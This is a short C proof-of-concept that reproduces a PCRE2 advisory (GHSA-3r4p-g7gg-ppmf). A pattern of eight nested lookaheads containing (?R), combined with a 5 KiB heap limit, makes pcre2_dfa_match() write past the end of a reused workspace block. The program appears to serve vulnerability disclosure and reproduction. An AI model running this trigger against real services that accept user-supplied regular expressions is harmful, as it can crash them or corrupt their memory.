/* Demonstration of GHSA-3r4p-g7gg-ppmf: pcre2_dfa_match() more_workspace()
reuses an existing next workspace block without checking that it is large
enough for the pending request.  With a small heap limit the first heap block
is clamped well below the size needed for an OP_RECURSE sub-match; when a
lookahead nest unwinds far enough to re-enter that block for a recursion, the
recursive internal_dfa_match() writes its state vectors past the end of the
block.

Driven entirely through the public API with in-contract input: a compiled
pattern, a match context carrying a heap limit, and pcre2_dfa_match().
*/

#include <stdio.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

/* Eight nested lookaheads: while the innermost pair runs, the stack
workspace block is exhausted and a first, heap-limit-clamped block is
allocated.  When the nest unwinds to the sixth level, the following (?R)
asks for a recursion-sized block and picks up the clamped one again. */

#define PATTERN "(?=(?=(?=(?=(?=(?=(?=(?=a))(?R)))))))"
#define HEAP_LIMIT_KIB 5

int main(void)
{
  int errorcode;
  PCRE2_SIZE erroroffset;
  int workspace[65536];
  const char subject[] = "aaaaaa";
  int rc;

  pcre2_code *re = pcre2_compile((PCRE2_SPTR)PATTERN, PCRE2_ZERO_TERMINATED,
    0, &errorcode, &erroroffset, NULL);
  if (re == NULL)
    {
    PCRE2_UCHAR message[256];
    pcre2_get_error_message(errorcode, message, sizeof(message));
    printf("compile failed at offset %lu: %s\n", (unsigned long)erroroffset,
      (char *)message);
    return 1;
    }

  pcre2_match_data *mdata = pcre2_match_data_create_from_pattern(re, NULL);
  pcre2_match_context *mcontext = pcre2_match_context_create(NULL);
  pcre2_set_heap_limit(mcontext, HEAP_LIMIT_KIB);

  rc = pcre2_dfa_match(re, (PCRE2_SPTR)subject, strlen(subject), 0, 0,
    mdata, mcontext, workspace, sizeof(workspace)/sizeof(workspace[0]));

  printf("pcre2_dfa_match returned %d\n", rc);

  pcre2_match_context_free(mcontext);
  pcre2_match_data_free(mdata);
  pcre2_code_free(re);
  return 0;
}
